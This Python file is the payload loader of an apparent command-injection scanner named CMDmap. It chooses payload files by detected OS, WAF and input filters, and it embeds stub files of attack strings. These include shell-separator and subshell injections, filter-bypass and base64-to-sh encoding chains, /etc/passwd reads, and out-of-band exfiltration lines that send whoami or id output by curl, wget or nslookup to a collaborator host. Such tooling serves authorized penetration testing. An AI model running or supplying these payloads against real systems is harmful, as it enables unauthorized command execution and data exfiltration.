"""
payload_loader.py — CMDmap External Payload Dispatcher
Loads payload files from payloads/ directory and dispatches
based on runtime context signals (OS, WAF, filters, param class).

File format (plain text, one payload per line):
  # comment lines ignored
  # @tags: linux, space_filter, waf_cloudflare
  # @tier: 2
  # @signal: system:linux_id
  # @blind: false
  <payload string>

Loader returns list of tuples matching CMDmap's PAYLOADS format:
  (payload_str, label, signal, is_blind, os_target)
"""

import os
import re
from pathlib import Path
from typing import Optional

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD FILE FORMAT
# ─────────────────────────────────────────────────────────────────────────────
# Each .txt file in payloads/ follows this structure:
#
#   # File-level defaults (apply to all payloads below unless overridden)
#   # @default_os:     linux          (linux | windows | both)
#   # @default_signal: system:linux_id
#   # @default_blind:  false
#   # @default_tier:   1
#
#   # Individual payload block (overrides file defaults)
#   # @label:  Semicolon id
#   # @signal: system:linux_id
#   # @blind:  false
#   # @os:     linux
#   ;id
#
#   # Next payload (inherits file defaults if no block header)
#   ;whoami
#
# Rules:
#   - Blank lines between payloads are ignored
#   - Lines starting with # are metadata or comments
#   - A payload is any non-empty, non-comment line
#   - Block headers MUST immediately precede their payload (no blank line between)
#   - File defaults in header block MUST appear before first payload

_META_LINE   = re.compile(r'^#\s*@(\w+):\s*(.+)$')
_COMMENT     = re.compile(r'^#')
_BLANK       = re.compile(r'^\s*$')

def _parse_payload_file(path: Path) -> list:
    """
    Parse a payload .txt file and return list of
    (payload, label, signal, is_blind, os_target) tuples.
    """
    results = []
    file_defaults = {
        "os":     "linux",
        "signal": "system:linux_id",
        "blind":  False,
        "tier":   1,
        "label":  None,
    }

    lines = path.read_text(encoding="utf-8", errors="replace").splitlines()

    # Pass 1: collect file-level defaults from leading header block
    for line in lines:
        if _BLANK.match(line):
            continue
        m = _META_LINE.match(line)
        if m:
            key, val = m.group(1).lower(), m.group(2).strip()
            if key == "default_os":
                file_defaults["os"] = val.lower()
            elif key == "default_signal":
                file_defaults["signal"] = val
            elif key == "default_blind":
                file_defaults["blind"] = val.lower() in ("true", "1", "yes")
            elif key == "default_tier":
                file_defaults["tier"] = int(val)
        else:
            # First non-meta, non-blank line = end of header block
            break

    # Pass 2: parse payload blocks
    current_meta = {}
    for line in lines:
        if _BLANK.match(line):
            # Blank line resets per-block metadata
            current_meta = {}
            continue

        m = _META_LINE.match(line)
        if m:
            key, val = m.group(1).lower(), m.group(2).strip()
            if key == "label":
                current_meta["label"] = val
            elif key == "signal":
                current_meta["signal"] = val
            elif key in ("blind", "timed"):
                current_meta["blind"] = val.lower() in ("true", "1", "yes")
            elif key == "os":
                current_meta["os"] = val.lower()
            # Skip default_* and tier in per-block — file-level only
            continue

        if _COMMENT.match(line):
            # Pure comment (not @meta) — ignored
            continue

        # It's a payload line
        payload = line.rstrip("\n")
        os_t    = current_meta.get("os",     file_defaults["os"])
        signal  = current_meta.get("signal", file_defaults["signal"])
        blind   = current_meta.get("blind",  file_defaults["blind"])
        label   = current_meta.get("label")
        if label is None:
            # Auto-generate label from file stem + first 20 chars of payload
            stem  = path.stem.replace("_", " ")
            label = f"{stem}: {payload[:20]}"

        # Expand "both" OS into two entries
        if os_t == "both":
            results.append((payload, label, signal, blind, "linux"))
            results.append((payload, label + " [win]", signal, blind, "windows"))
        else:
            results.append((payload, label, signal, blind, os_t))

        # Reset per-block meta after consuming the payload
        current_meta = {}

    return results


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD DIRECTORY LAYOUT
# ─────────────────────────────────────────────────────────────────────────────
#
#  payloads/
#  ├── core/          — always loaded (base detection layer)
#  │   ├── linux_direct.txt
#  │   ├── windows_direct.txt
#  │   └── context_escape.txt
#  ├── bypass/        — loaded when filter signals detected
#  │   ├── space_bypass.txt      → filter: no_space
#  │   ├── waf_evasion.txt       → filter: waf / waf_block
#  │   ├── encoding_chains.txt   → filter: base64 / hex / double_url
#  │   └── ansi_brace.txt        → filter: no_semicolon (or always in Tier5)
#  ├── oob/           — loaded when --collab flag active
#  │   ├── dns_exfil.txt
#  │   └── http_exfil.txt
#  ├── context/       — loaded by param risk class / path hint
#  │   ├── file_params.txt       → param name matches file/path/dir
#  │   ├── network_params.txt    → param name matches host/ip/target/ping
#  │   └── exec_params.txt       → param name matches cmd/exec/run/shell
#  └── custom/        — user-supplied, never touched by updates
#      └── *.txt (all loaded unconditionally as Tier 5 extension)

_PAYLOAD_DIR = Path(__file__).parent / "payloads"

# Dispatch table: maps context key → subdirectory/file glob
# context keys are produced by the runtime context builder below
_DISPATCH = {
    # Always
    "core_linux":       ("core", "linux_direct.txt"),
    "core_windows":     ("core", "windows_direct.txt"),
    "core_escape":      ("core", "context_escape.txt"),
    # Filter-triggered bypass
    "filter_no_space":  ("bypass", "space_bypass.txt"),
    "filter_waf":       ("bypass", "waf_evasion.txt"),
    "filter_encoding":  ("bypass", "encoding_chains.txt"),
    "filter_separator": ("bypass", "ansi_brace.txt"),
    # OOB
    "oob_dns":          ("oob",  "dns_exfil.txt"),
    "oob_http":         ("oob",  "http_exfil.txt"),
    # Context-specific
    "ctx_file":         ("context", "file_params.txt"),
    "ctx_network":      ("context", "network_params.txt"),
    "ctx_exec":         ("context", "exec_params.txt"),
}

_PARAM_NETWORK = re.compile(r'\b(?:host|ip|addr|address|target|ping|dns|resolve|lookup|scan)\b', re.I)
_PARAM_FILE    = re.compile(r'\b(?:file|path|dir|folder|src|source|dest|log|name|upload|download|read|include)\b', re.I)
_PARAM_EXEC    = re.compile(r'\b(?:cmd|command|exec|execute|run|shell|script|proc|process|eval)\b', re.I)


def build_context_keys(
    os_target:    str,
    run_both:     bool,
    active_filters: set,
    collab_url:   Optional[str],
    param_names:  list,
) -> list:
    """
    Determine which payload files to load based on runtime signals.

    Args:
        os_target:      'linux' | 'windows'
        run_both:       True if OS confidence is low (load both)
        active_filters: set of filter labels from AdaptiveBypass.detect_filters()
        collab_url:     collaborator URL if --collab was passed
        param_names:    list of param names being tested (for context dispatch)

    Returns:
        Ordered list of dispatch keys (see _DISPATCH table above)
    """
    keys = []

    # Core — always
    if os_target == "linux" or run_both:
        keys.append("core_linux")
        keys.append("core_escape")
    if os_target == "windows" or run_both:
        keys.append("core_windows")

    # Filter-triggered bypass
    if "no_space" in active_filters or "waf" in active_filters:
        keys.append("filter_no_space")
    if "waf" in active_filters or "waf_block" in active_filters:
        keys.append("filter_waf")
    if any(f in active_filters for f in ("base64", "hex", "double_url")):
        keys.append("filter_encoding")
    if "no_semicolon" in active_filters:
        keys.append("filter_separator")

    # OOB
    if collab_url:
        keys.append("oob_dns")
        keys.append("oob_http")

    # Context from param names
    for p in param_names:
        if _PARAM_NETWORK.search(p) and "ctx_network" not in keys:
            keys.append("ctx_network")
        if _PARAM_FILE.search(p) and "ctx_file" not in keys:
            keys.append("ctx_file")
        if _PARAM_EXEC.search(p) and "ctx_exec" not in keys:
            keys.append("ctx_exec")

    return keys


class PayloadLoader:
    """
    Loads external payload files and merges with the internal PAYLOADS list.

    Usage:
        loader = PayloadLoader(payload_dir=Path("payloads"))
        extra  = loader.load(context_keys)
        all_payloads = PAYLOADS + extra
    """

    def __init__(self, payload_dir: Optional[Path] = None):
        self._dir    = payload_dir or _PAYLOAD_DIR
        self._cache: dict[Path, list] = {}

    def _load_file(self, path: Path) -> list:
        if not path.exists():
            return []
        if path not in self._cache:
            try:
                self._cache[path] = _parse_payload_file(path)
            except Exception as e:
                # Never crash the scanner on a bad payload file
                self._cache[path] = []
        return self._cache[path]

    def load(self, context_keys: list) -> list:
        """
        Load payloads for the given context keys.
        Deduplicates by (payload_str, os_target) to avoid redundant requests.
        Returns list of (payload, label, signal, blind, os) tuples.
        """
        seen    = set()
        results = []

        for key in context_keys:
            entry = _DISPATCH.get(key)
            if not entry:
                continue
            subdir, filename = entry
            path = self._dir / subdir / filename
            for item in self._load_file(path):
                dedup_key = (item[0], item[4])   # (payload_str, os_target)
                if dedup_key not in seen:
                    seen.add(dedup_key)
                    results.append(item)

        # Always load custom/ — all .txt files, no dispatch key needed
        custom_dir = self._dir / "custom"
        if custom_dir.is_dir():
            for txt in sorted(custom_dir.glob("*.txt")):
                for item in self._load_file(txt):
                    dedup_key = (item[0], item[4])
                    if dedup_key not in seen:
                        seen.add(dedup_key)
                        results.append(item)

        return results

    def stats(self, context_keys: list) -> dict:
        """Return a summary of how many payloads would be loaded per key."""
        out = {}
        for key in context_keys:
            entry = _DISPATCH.get(key)
            if not entry:
                out[key] = 0
                continue
            subdir, filename = entry
            path = self._dir / subdir / filename
            out[key] = len(self._load_file(path))
        custom_dir = self._dir / "custom"
        custom_count = 0
        if custom_dir.is_dir():
            for txt in custom_dir.glob("*.txt"):
                custom_count += len(self._load_file(txt))
        out["custom"] = custom_count
        return out

    def create_scaffold(self):
        """
        Create the payloads/ directory scaffold with stub files.
        Called by --init-payloads flag. Never overwrites existing files.
        """
        _SUBDIRS = ["core", "bypass", "oob", "context", "custom"]
        _STUBS = {
            "core/linux_direct.txt": _STUB_LINUX_DIRECT,
            "core/windows_direct.txt": _STUB_WINDOWS_DIRECT,
            "core/context_escape.txt": _STUB_CONTEXT_ESCAPE,
            "bypass/space_bypass.txt": _STUB_SPACE_BYPASS,
            "bypass/waf_evasion.txt": _STUB_WAF_EVASION,
            "bypass/encoding_chains.txt": _STUB_ENCODING_CHAINS,
            "bypass/ansi_brace.txt": _STUB_ANSI_BRACE,
            "oob/dns_exfil.txt": _STUB_DNS_EXFIL,
            "oob/http_exfil.txt": _STUB_HTTP_EXFIL,
            "context/file_params.txt": _STUB_FILE_PARAMS,
            "context/network_params.txt": _STUB_NETWORK_PARAMS,
            "context/exec_params.txt": _STUB_EXEC_PARAMS,
            "custom/README.txt": _STUB_CUSTOM_README,
        }
        for sub in _SUBDIRS:
            (self._dir / sub).mkdir(parents=True, exist_ok=True)

        created = []
        for rel, content in _STUBS.items():
            p = self._dir / rel
            if not p.exists():
                p.write_text(content, encoding="utf-8")
                created.append(str(p))

        return created


# ─────────────────────────────────────────────────────────────────────────────
# STUB FILE CONTENT
# ─────────────────────────────────────────────────────────────────────────────

_STUB_LINUX_DIRECT = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   1
#
# Extended Linux direct-output payloads.
# Add one payload per line. Use @label/@signal/@blind/@os to annotate blocks.
# Lines beginning with # are ignored.

# @label: Semicolon id (extended)
# @signal: system:linux_id
;id

# @label: OR-separator id
# @signal: system:linux_id
||id

# @label: Pipe id no space
# @signal: system:linux_id
|id

# @label: Subshell id
# @signal: system:linux_id
$(id)

# @label: Backtick id
# @signal: system:linux_id
`id`

# @label: Semicolon whoami
# @signal: system:linux_user
;whoami

# @label: Subshell whoami
# @signal: system:linux_user
$(whoami)

# @label: Uname kernel
# @signal: system:linux_uname
;uname -a

# @label: Newline id
# @signal: system:linux_id
%0aid

# @label: CRLF id
# @signal: system:linux_id
%0d%0aid
"""

_STUB_WINDOWS_DIRECT = """\
# @default_os:     windows
# @default_signal: system:win_user
# @default_blind:  false
# @default_tier:   1

# @label: Ampersand whoami
&whoami

# @label: Pipe whoami
|whoami

# @label: Cmd /c whoami
# @signal: system:win_user
&cmd /c whoami

# @label: PowerShell whoami
# @signal: system:win_user
|powershell -NoP -NonI -W Hidden whoami

# @label: PowerShell encoded whoami
# @signal: system:win_user
# Note: d2hvYW1p = base64("whoami")
|powershell -enc d2hvYW1p

# @label: Win ver
# @signal: system:win_ver
&ver
"""

_STUB_CONTEXT_ESCAPE = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   1
#
# Quote-context and argument injection escapes.

# @label: Single-quote escape id
';id;'

# @label: Double-quote escape id
";id;"

# @label: Quote-escape whoami
# @signal: system:linux_user
';whoami;'

# @label: DQ-escape whoami
# @signal: system:linux_user
";whoami;"

# @label: Mid-value backtick id
x`id`y

# @label: Mid-value subshell id
x$(id)y

# @label: Tar flag inject id
# @signal: system:linux_id
--use-compress-program=id

# @label: Arg inject --exec
--exec=id

# @label: Arg inject -e flag
-e id
"""

_STUB_SPACE_BYPASS = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   5
#
# Space-filter bypass payloads.
# Triggered when filter: no_space detected in error response.
# Technique: replace spaces with ${IFS}, tab (\\t), or brace expansion.

# @label: IFS id
;${IFS}id

# @label: IFS whoami
# @signal: system:linux_user
;${IFS}whoami

# @label: Tab id
# @blind: false
;	id

# @label: Brace exec id (no space)
# @signal: system:linux_id
;{id,}

# @label: Brace cat passwd (no space)
# @signal: linux_passwd
;{cat,/etc/passwd}

# @label: IFS sleep 10
# @signal: time
# @blind: true
;${IFS}sleep${IFS}10

# @label: IFS uname
# @signal: system:linux_uname
;${IFS}uname${IFS}-a
"""

_STUB_WAF_EVASION = """\
# @default_os:     linux
# @default_signal: time
# @default_blind:  true
# @default_tier:   5
#
# WAF evasion payloads.
# Triggered when waf/waf_block filter detected.
# Primarily timing-based (non-keyword). dd bypass avoids sleep/ping.

# @label: dd tab delay 50MB
# @blind: true
# @signal: time
;dd\tif=/dev/zero\tbs=1M\tcount=50

# @label: dd IFS delay 50MB
# @blind: true
# @signal: time
;dd${IFS}if=/dev/zero${IFS}bs=1M${IFS}count=50

# @label: ANSI-C hex id
# @signal: system:linux_id
# @blind: false
;$'\\x69\\x64'

# @label: ANSI-C hex whoami
# @signal: system:linux_user
# @blind: false
;$'\\x77\\x68\\x6f\\x61\\x6d\\x69'

# @label: ANSI-C hex sleep 10
# @signal: time
# @blind: true
;$'\\x73\\x6c\\x65\\x65\\x70'${IFS}10

# @label: Var concat id bypass
# @signal: system:linux_id
# @blind: false
;i$()d

# @label: Env var execution
# @signal: system:linux_id
;a=id;$a
"""

_STUB_ENCODING_CHAINS = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   5
#
# Encoding chain payloads.
# Triggered when base64/hex/double_url filters detected.
# These assume the server pre-decodes param values before passing to shell.
# The injector's _detect_input_encoding() result should gate these.

# @label: B64 wrap: echo b64|base64 -d|sh (id)
# Note: payload below = ;echo aWQ=|base64 -d|sh
;echo aWQ=|base64 -d|sh

# @label: B64 wrap: echo b64|base64 -d|sh (whoami)
# @signal: system:linux_user
;echo d2hvYW1p|base64 -d|sh

# @label: B64 wrap sleep 10
# @signal: time
# @blind: true
;echo c2xlZXAgMTA=|base64 -d|sh

# @label: Double-URL newline id
# @signal: system:linux_id
%250aid

# @label: Double-URL pipe id
# @signal: system:linux_id
%257Cid

# @label: Hex printf id
;printf '\\x69\\x64'|sh

# @label: Hex printf whoami
# @signal: system:linux_user
;printf '\\x77\\x68\\x6f\\x61\\x6d\\x69'|sh
"""

_STUB_ANSI_BRACE = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   5
#
# ANSI-C quoting and brace expansion — no semicolon, no standard separators.
# Triggered when no_semicolon filter detected, or as general Tier 5 extension.

# @label: Brace exec id
{id,}

# @label: Pipe brace whoami
# @signal: system:linux_user
|{whoami,}

# @label: Subshell brace id
$({id,})

# @label: ANSI-C $'...' id
$'\\x69\\x64'

# @label: Newline brace id
%0a{id,}

# @label: OR brace whoami
# @signal: system:linux_user
||{whoami,}
"""

_STUB_DNS_EXFIL = """\
# @default_os:     linux
# @default_signal: oob
# @default_blind:  false
# @default_tier:   4
#
# DNS OOB exfiltration payloads.
# Loaded when --collab is set. COLLAB_HOST is substituted at runtime.

; nslookup COLLAB_HOST
| nslookup COLLAB_HOST
; nslookup `whoami`.COLLAB_HOST
| nslookup `id`.COLLAB_HOST
$(nslookup COLLAB_HOST)
`nslookup COLLAB_HOST`

# @label: dig OOB
; dig COLLAB_HOST

# @label: host OOB
; host COLLAB_HOST
"""

_STUB_HTTP_EXFIL = """\
# @default_os:     linux
# @default_signal: oob
# @default_blind:  false
# @default_tier:   4
#
# HTTP OOB exfiltration payloads.
# COLLAB_URL is substituted at runtime.

; curl -s COLLAB_URL
; wget -q COLLAB_URL
; curl -s COLLAB_URL/`whoami`
; curl -s COLLAB_URL/?x=`id`
$(curl -s COLLAB_URL)

# @label: curl with base64 id
; curl -s COLLAB_URL/$(id|base64 -w0)

# @label: wget whoami exfil
; wget -q -O /dev/null COLLAB_URL/`whoami`
"""

_STUB_FILE_PARAMS = """\
# @default_os:     linux
# @default_signal: linux_passwd
# @default_blind:  false
# @default_tier:   2
#
# Payloads for file/path/dir parameters.
# Loaded when param name matches file-related keywords.
# Combines CMDi with path traversal probe for double-coverage.

# @label: Cat passwd direct
;cat /etc/passwd

# @label: Cat passwd IFS
;cat${IFS}/etc/passwd

# @label: Cat passwd brace
;{cat,/etc/passwd}

# @label: Cat passwd b64 exfil
# @signal: system:linux_user
;cat /etc/passwd|base64 -w0

# @label: Tac passwd (reverse cat)
;tac /etc/passwd

# @label: Head passwd 1 line
;head -1 /etc/passwd
"""

_STUB_NETWORK_PARAMS = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   2
#
# Payloads for host/ip/target/ping parameters.
# These are highest-probability CMDi sinks in network-facing apps.

# @label: Inline id after IP
127.0.0.1;id

# @label: Inline whoami after IP
# @signal: system:linux_user
127.0.0.1;whoami

# @label: Pipe id after IP
127.0.0.1|id

# @label: Subshell after IP
127.0.0.1$(id)

# @label: Newline id after IP
127.0.0.1%0aid

# @label: AND id after IP
127.0.0.1&&id

# @label: Sleep after IP
# @signal: time
# @blind: true
127.0.0.1;sleep 10

# @label: Win ping chain whoami
# @os: windows
# @signal: system:win_user
127.0.0.1&whoami
"""

_STUB_EXEC_PARAMS = """\
# @default_os:     linux
# @default_signal: system:linux_id
# @default_blind:  false
# @default_tier:   1
#
# Payloads for cmd/exec/run/shell/eval parameters.
# These are direct execution sinks — start with identity probes.

# @label: Direct id
id

# @label: Direct whoami
# @signal: system:linux_user
whoami

# @label: Direct sleep
# @signal: time
# @blind: true
sleep 10

# @label: Direct uname
# @signal: system:linux_uname
uname -a

# @label: Chained id after noop
noop;id

# @label: Win direct whoami
# @os: windows
# @signal: system:win_user
whoami
"""

_STUB_CUSTOM_README = """\
# CMDmap custom payload directory
# ────────────────────────────────────────────────────────────────
# Drop any .txt files here. They are loaded unconditionally as
# Tier 5 extensions and are NEVER overwritten by updates.
#
# File format — same as core/ files:
#   # @label:  My payload label
#   # @signal: system:linux_id
#   # @blind:  false
#   # @os:     linux
#   ;my_payload_here
#
# Valid @signal values:
#   echo            — token echo confirmation
#   system:linux_id — uid=N(user) gid=N pattern
#   system:linux_user — bare username output
#   system:linux_uname — kernel version string
#   system:win_user — domain\\user pattern
#   system:win_ver  — Microsoft Windows [Version ...] 
#   linux_passwd    — /etc/passwd content
#   win_ini         — win.ini [fonts] section
#   time            — timing-based blind (set @blind: true)
#   oob             — OOB callback (needs --collab)
#   oob_data        — OOB with data exfil
#   redirect:PATH   — file redirect confirmation
"""
